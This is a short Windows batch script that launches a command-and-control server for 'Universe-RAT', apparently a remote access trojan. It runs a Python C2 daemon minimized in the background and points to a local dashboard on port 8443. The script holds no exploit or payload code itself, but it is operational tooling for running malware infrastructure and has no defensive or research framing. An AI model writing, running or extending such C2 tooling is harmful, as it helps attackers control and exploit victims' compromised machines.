@echo off
REM Start Universe-RAT C2 Server in background
echo Starting Universe-RAT C2 Server...

start "Universe-RAT C2" /MIN python F:\universe_rat_system\c2_daemon.py

echo.
echo ✅ C2 Server started in background!
echo 📊 Dashboard: http://localhost:8443
echo.
echo To stop: Close "Universe-RAT C2" window from Task Manager
pause
